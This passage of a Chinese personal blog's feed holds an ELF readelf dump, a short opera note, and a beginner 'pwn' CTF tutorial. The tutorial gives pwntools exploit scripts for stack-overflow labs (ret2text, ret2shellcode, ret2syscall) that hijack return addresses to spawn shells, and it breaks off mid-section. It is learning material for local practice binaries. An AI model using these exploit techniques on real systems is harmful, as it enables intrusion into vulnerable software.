class="line">  [ 6] .dynstr           STRTAB          0804820c 00020c 000045 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          08048252 000252 000008 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         0804825c 00025c 000020 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             0804827c 00027c 000008 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             08048284 000284 000008 08  AI  5  24  4</span><br><span class="line">  [11] .init             PROGBITS        0804828c 00028c 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        080482b0 0002b0 000020 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        080482d0 0002d0 000008 00  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        080482e0 0002e0 000182 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        08048464 000464 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        08048478 000478 000008 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        08048480 000480 00002c 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        080484ac 0004ac 0000c0 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [24] .got.plt          PROGBITS        0804a000 001000 000010 04  WA  0   0  4</span><br><span class="line">  [25] .data             PROGBITS        0804a010 001010 000008 00  WA  0   0  4</span><br><span class="line">  [26] .bss              NOBITS          0804a018 001018 000004 00  WA  0   0  1</span><br><span class="line">  [27] .comment          PROGBITS        00000000 001018 000035 01  MS  0   0  1</span><br><span class="line">  [28] .shstrtab         STRTAB          00000000 0016ad 00010a 00      0   0  1</span><br><span class="line">  [29] .symtab           SYMTAB          00000000 001050 000440 10     30  47  4</span><br><span class="line">  [30] .strtab           STRTAB          00000000 001490 00021d 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br><span class="line"></span><br><span class="line">There are no section groups in this file.</span><br><span class="line"></span><br><span class="line">Program Headers:</span><br><span class="line">  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align</span><br><span class="line">  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4</span><br><span class="line">  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1</span><br><span class="line">      [Requesting program interpreter: /lib/ld-linux.so.2]</span><br><span class="line">  LOAD           0x000000 0x08048000 0x08048000 0x0056c 0x0056c R E 0x1000</span><br><span class="line">  LOAD           0x000f08 0x08049f08 0x08049f08 0x00110 0x00114 RW  0x1000</span><br><span class="line">  DYNAMIC        0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4</span><br><span class="line">  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4</span><br><span class="line">  GNU_EH_FRAME   0x000480 0x08048480 0x08048480 0x0002c 0x0002c R   0x4</span><br><span class="line">  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10</span><br><span class="line">  GNU_RELRO      0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R   0x1</span><br><span class="line"></span><br><span class="line"> Section to Segment mapping:</span><br><span class="line">  Segment Sections...</span><br><span class="line">   00</span><br><span class="line">   01     .interp</span><br><span class="line">   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame</span><br><span class="line">   03     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss</span><br><span class="line">   04     .dynamic</span><br><span class="line">   05     .note.ABI-tag .note.gnu.build-id</span><br><span class="line">   06     .eh_frame_hdr</span><br><span class="line">   07</span><br><span class="line">   08     .init_array .fini_array .jcr .dynamic .got</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0xf14 contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x804828c</span><br><span class="line"> 0x0000000d (FINI)                       0x8048464</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x8049f08</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x8049f0c</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x80481ac</span><br><span class="line"> 0x00000005 (STRTAB)                     0x804820c</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x80481cc</span><br><span class="line"> 0x0000000a (STRSZ)                      69 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000015 (DEBUG)                      0x0</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x804a000</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   8 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x8048284</span><br><span class="line"> 0x00000011 (REL)                        0x804827c</span><br><span class="line"> 0x00000012 (RELSZ)                      8 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x804825c</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x8048252</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br><span class="line"></span><br><span class="line">Relocation section &apos;.rel.dyn&apos; at offset 0x27c contains 1 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">08049ffc  00000106 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line"></span><br><span class="line">Relocation section &apos;.rel.plt&apos; at offset 0x284 contains 1 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">0804a00c  00000207 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line"></span><br><span class="line">The decoding of unwind sections for machine type Intel 80386 is not currently supported.</span><br><span class="line"></span><br><span class="line">Symbol table &apos;.dynsym&apos; contains 4 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)</span><br><span class="line">     3: 0804847c     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used</span><br><span class="line"></span><br><span class="line">Symbol table &apos;.symtab&apos; contains 68 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 08048154     0 SECTION LOCAL  DEFAULT    1</span><br><span class="line">     2: 08048168     0 SECTION LOCAL  DEFAULT    2</span><br><span class="line">     3: 08048188     0 SECTION LOCAL  DEFAULT    3</span><br><span class="line">     4: 080481ac     0 SECTION LOCAL  DEFAULT    4</span><br><span class="line">     5: 080481cc     0 SECTION LOCAL  DEFAULT    5</span><br><span class="line">     6: 0804820c     0 SECTION LOCAL  DEFAULT    6</span><br><span class="line">     7: 08048252     0 SECTION LOCAL  DEFAULT    7</span><br><span class="line">     8: 0804825c     0 SECTION LOCAL  DEFAULT    8</span><br><span class="line">     9: 0804827c     0 SECTION LOCAL  DEFAULT    9</span><br><span class="line">    10: 08048284     0 SECTION LOCAL  DEFAULT   10</span><br><span class="line">    11: 0804828c     0 SECTION LOCAL  DEFAULT   11</span><br><span class="line">    12: 080482b0     0 SECTION LOCAL  DEFAULT   12</span><br><span class="line">    13: 080482d0     0 SECTION LOCAL  DEFAULT   13</span><br><span class="line">    14: 080482e0     0 SECTION LOCAL  DEFAULT   14</span><br><span class="line">    15: 08048464     0 SECTION LOCAL  DEFAULT   15</span><br><span class="line">    16: 08048478     0 SECTION LOCAL  DEFAULT   16</span><br><span class="line">    17: 08048480     0 SECTION LOCAL  DEFAULT   17</span><br><span class="line">    18: 080484ac     0 SECTION LOCAL  DEFAULT   18</span><br><span class="line">    19: 08049f08     0 SECTION LOCAL  DEFAULT   19</span><br><span class="line">    20: 08049f0c     0 SECTION LOCAL  DEFAULT   20</span><br><span class="line">    21: 08049f10     0 SECTION LOCAL  DEFAULT   21</span><br><span class="line">    22: 08049f14     0 SECTION LOCAL  DEFAULT   22</span><br><span class="line">    23: 08049ffc     0 SECTION LOCAL  DEFAULT   23</span><br><span class="line">    24: 0804a000     0 SECTION LOCAL  DEFAULT   24</span><br><span class="line">    25: 0804a010     0 SECTION LOCAL  DEFAULT   25</span><br><span class="line">    26: 0804a018     0 SECTION LOCAL  DEFAULT   26</span><br><span class="line">    27: 00000000     0 SECTION LOCAL  DEFAULT   27</span><br><span class="line">    28: 00000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">    29: 08049f10     0 OBJECT  LOCAL  DEFAULT   21 __JCR_LIST__</span><br><span class="line">    30: 08048320     0 FUNC    LOCAL  DEFAULT   14 deregister_tm_clones</span><br><span class="line">    31: 08048350     0 FUNC    LOCAL  DEFAULT   14 register_tm_clones</span><br><span class="line">    32: 08048390     0 FUNC    LOCAL  DEFAULT   14 __do_global_dtors_aux</span><br><span class="line">    33: 0804a018     1 OBJECT  LOCAL  DEFAULT   26 completed.7209</span><br><span class="line">    34: 08049f0c     0 OBJECT  LOCAL  DEFAULT   20 __do_global_dtors_aux_fin</span><br><span class="line">    35: 080483b0     0 FUNC    LOCAL  DEFAULT   14 frame_dummy</span><br><span class="line">    36: 08049f08     0 OBJECT  LOCAL  DEFAULT   19 __frame_dummy_init_array_</span><br><span class="line">    37: 00000000     0 FILE    LOCAL  DEFAULT  ABS hello.c</span><br><span class="line">    38: 00000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">    39: 08048568     0 OBJECT  LOCAL  DEFAULT   18 __FRAME_END__</span><br><span class="line">    40: 08049f10     0 OBJECT  LOCAL  DEFAULT   21 __JCR_END__</span><br><span class="line">    41: 00000000     0 FILE    LOCAL  DEFAULT  ABS</span><br><span class="line">    42: 08049f0c     0 NOTYPE  LOCAL  DEFAULT   19 __init_array_end</span><br><span class="line">    43: 08049f14     0 OBJECT  LOCAL  DEFAULT   22 _DYNAMIC</span><br><span class="line">    44: 08049f08     0 NOTYPE  LOCAL  DEFAULT   19 __init_array_start</span><br><span class="line">    45: 08048480     0 NOTYPE  LOCAL  DEFAULT   17 __GNU_EH_FRAME_HDR</span><br><span class="line">    46: 0804a000     0 OBJECT  LOCAL  DEFAULT   24 _GLOBAL_OFFSET_TABLE_</span><br><span class="line">    47: 08048460     2 FUNC    GLOBAL DEFAULT   14 __libc_csu_fini</span><br><span class="line">    48: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterTMCloneTab</span><br><span class="line">    49: 08048310     4 FUNC    GLOBAL HIDDEN    14 __x86.get_pc_thunk.bx</span><br><span class="line">    50: 0804a010     0 NOTYPE  WEAK   DEFAULT   25 data_start</span><br><span class="line">    51: 0804a018     0 NOTYPE  GLOBAL DEFAULT   25 _edata</span><br><span class="line">    52: 08048464     0 FUNC    GLOBAL DEFAULT   15 _fini</span><br><span class="line">    53: 0804a010     0 NOTYPE  GLOBAL DEFAULT   25 __data_start</span><br><span class="line">    54: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">    55: 0804a014     0 OBJECT  GLOBAL HIDDEN    25 __dso_handle</span><br><span class="line">    56: 0804847c     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used</span><br><span class="line">    57: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_</span><br><span class="line">    58: 08048400    93 FUNC    GLOBAL DEFAULT   14 __libc_csu_init</span><br><span class="line">    59: 0804a01c     0 NOTYPE  GLOBAL DEFAULT   26 _end</span><br><span class="line">    60: 080482e0     0 FUNC    GLOBAL DEFAULT   14 _start</span><br><span class="line">    61: 08048478     4 OBJECT  GLOBAL DEFAULT   16 _fp_hw</span><br><span class="line">    62: 0804a018     0 NOTYPE  GLOBAL DEFAULT   26 __bss_start</span><br><span class="line">    63: 080483db    24 FUNC    GLOBAL DEFAULT   14 main</span><br><span class="line">    64: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _Jv_RegisterClasses</span><br><span class="line">    65: 0804a018     0 OBJECT  GLOBAL HIDDEN    25 __TMC_END__</span><br><span class="line">    66: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMCloneTable</span><br><span class="line">    67: 0804828c     0 FUNC    GLOBAL DEFAULT   11 _init</span><br><span class="line"></span><br><span class="line">Histogram for `.gnu.hash&apos; bucket list length (total of 2 buckets):</span><br><span class="line"> Length  Number     % of total  Coverage</span><br><span class="line">      0  1          ( 50.0%)</span><br><span class="line">      1  1          ( 50.0%)    100.0%</span><br><span class="line"></span><br><span class="line">Version symbols section &apos;.gnu.version&apos; contains 4 entries:</span><br><span class="line"> Addr: 0000000008048252  Offset: 0x000252  Link: 5 (.dynsym)</span><br><span class="line">  000:   0 (*local*)       0 (*local*)       2 (GLIBC_2.0)     1 (*global*)</span><br><span class="line"></span><br><span class="line">Version needs section &apos;.gnu.version_r&apos; contains 1 entries:</span><br><span class="line"> Addr: 0x000000000804825c  Offset: 0x00025c  Link: 6 (.dynstr)</span><br><span class="line">  000000: Version: 1  File: libc.so.6  Cnt: 1</span><br><span class="line">  0x0010:   Name: GLIBC_2.0  Flags: none  Version: 2</span><br><span class="line"></span><br><span class="line">Displaying notes found at file offset 0x00000168 with length 0x00000020:</span><br><span class="line">  Owner                 Data size       Description</span><br><span class="line">  GNU                  0x00000010       NT_GNU_ABI_TAG (ABI version tag)</span><br><span class="line">    OS: Linux, ABI: 2.6.32</span><br><span class="line"></span><br><span class="line">Displaying notes found at file offset 0x00000188 with length 0x00000024:</span><br><span class="line">  Owner                 Data size       Description</span><br><span class="line">  GNU                  0x00000014       NT_GNU_BUILD_ID (unique build ID bitstring)</span><br><span class="line">    Build ID: 59a287bd61f3c01f4a0f4838756814c2de1bf490</span><br></pre></td></tr></table></figure><p>这样看一遍结构会比干看分析或者结构体要好一些。其实结构也不是很复杂。</p><p>linux 有标准库<code>elf.h</code>来解析 ELF 文件，或许写一遍怎么解析理解会更深一些。</p><p>之前看都是瞎看了，elf header 里一些无关紧要的 flag 记了一堆，看到后来关键的 section、segment 都冇脑子了。</p><p>还是挺重要的，理解力差就多想几遍，记忆力差就多看几遍，无它。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ELF 文件结构屡看屡忘，写个 hello.c 分析一下。&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span cla
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://github.com/Cracke-S-J/categories/CTF/"/>
    
      <category term="pwn" scheme="https://github.com/Cracke-S-J/categories/CTF/pwn/"/>
    
    
      <category term="CTF" scheme="https://github.com/Cracke-S-J/tags/CTF/"/>
    
      <category term="pwn" scheme="https://github.com/Cracke-S-J/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>珠帘寨</title>
    <link href="https://github.com/Cracke-S-J/2019/07/25/zhulianzhai/"/>
    <id>https://github.com/Cracke-S-J/2019/07/25/zhulianzhai/</id>
    <published>2019-07-25T13:25:21.000Z</published>
    <updated>2020-03-23T09:22:12.119Z</updated>
    
    <content type="html"><![CDATA[<p>这部戏只看过准叔版的，当笑话看了哈哈哈哈哈哈哈哈。</p><p>李克用真是个人才，对唐王怀恨在心不发兵，怕老婆，家法严发兵了，遇到周德威出来打架，完虐周德威，射箭老眼昏花看不清，求了一遍神灵，然后射中了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这部戏只看过准叔版的，当笑话看了哈哈哈哈哈哈哈哈。&lt;/p&gt;
&lt;p&gt;李克用真是个人才，对唐王怀恨在心不发兵，怕老婆，家法严发兵了，遇到周德威出来打架，完虐周德威，射箭老眼昏花看不清，求了一遍神灵，然后射中了。&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="听戏" scheme="https://github.com/Cracke-S-J/categories/%E5%90%AC%E6%88%8F/"/>
    
    
      <category term="京剧" scheme="https://github.com/Cracke-S-J/tags/%E4%BA%AC%E5%89%A7/"/>
    
  </entry>
  
  <entry>
    <title>pwn 入门</title>
    <link href="https://github.com/Cracke-S-J/2019/07/21/pwn1/"/>
    <id>https://github.com/Cracke-S-J/2019/07/21/pwn1/</id>
    <published>2019-07-20T17:21:05.000Z</published>
    <updated>2020-04-01T05:57:13.801Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>我用的是 windows 的 ubuntu。</p><h3 id="安装-pwntools"><a href="#安装-pwntools" class="headerlink" title="安装 pwntools"></a>安装 pwntools</h3><p><code>pip install pwntools</code></p><h3 id="64-位-windows-支持-32-位-linux-程序-安装-qemu-amp-binfmt"><a href="#64-位-windows-支持-32-位-linux-程序-安装-qemu-amp-binfmt" class="headerlink" title="64 位 windows 支持 32 位 linux 程序,安装 qemu &amp; binfmt"></a>64 位 windows 支持 32 位 linux 程序,安装 qemu &amp; binfmt</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install qemu-user-static</span><br><span class="line">sudo update-binfmts --install i386 /usr/bin/qemu-i386-static --magic '\x7fELF\x01\x01\x01\x03\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x03\x00\x01\x00\x00\x00' --mask '\xff\xff\xff\xff\xff\xff\xff\xfc\xff\xff\xff\xff\xff\xff\xff\xff\xf8\xff\xff\xff\xff\xff\xff\xff'</span><br><span class="line">service binfmt-support start</span><br></pre></td></tr></table></figure><h3 id="关-pie，编译时加-no-pie"><a href="#关-pie，编译时加-no-pie" class="headerlink" title="关 pie，编译时加 -no-pie"></a>关 pie，编译时加 -no-pie</h3><h2 id="0x00-stack-example"><a href="#0x00-stack-example" class="headerlink" title="0x00 stack_example"></a>0x00 stack_example</h2><p>pwn 的 hello world。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You Hava already controlled it."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    vulnerable();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./stack_example'</span>)</span><br><span class="line">success_addr = <span class="number">0x0804843b</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x14</span> + <span class="string">'bbbb'</span> + p32(success_addr)</span><br><span class="line"><span class="keyword">print</span> p32(success_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x01-ret2text"><a href="#0x01-ret2text" class="headerlink" title="0x01 ret2text"></a>0x01 ret2text</h2><p>大致是这样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">secure</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> input; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">    <span class="keyword">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">    v0 = time(<span class="number">0</span>);</span><br><span class="line">    srand(v0);</span><br><span class="line">    secretcode = rand();</span><br><span class="line">    __isoc99_scanf((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_8048760, &amp;input);</span><br><span class="line">    <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"There is something amazing here, do you know anything?"</span>);</span><br><span class="line">    gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Maybe I will tell you next time !"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要注意是相对 esp 索引的。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2text'</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line">sh.sendline(<span class="string">'A'</span> * (<span class="number">0x6c</span>+<span class="number">4</span>) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x02-ret2shellcode"><a href="#0x02-ret2shellcode" class="headerlink" title="0x02 ret2shellcode"></a>0x02 ret2shellcode</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No system for you this time !!!"</span>);</span><br><span class="line">    gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">    <span class="built_in">strncpy</span>(buf2, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4, <span class="number">0x64</span>u);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"bye bye ~"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过 vmmap 可以看到 bss 段的执行权限。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2shellcode'</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">'A'</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x03-ret2syscall"><a href="#0x03-ret2syscall" class="headerlink" title="0x03 ret2syscall"></a>0x03 ret2syscall</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"This time, no system() and NO SHELLCODE!!!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What do you plan to do?"</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要用到 ROPgadget，然后选几个合适的构造 shellcode。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 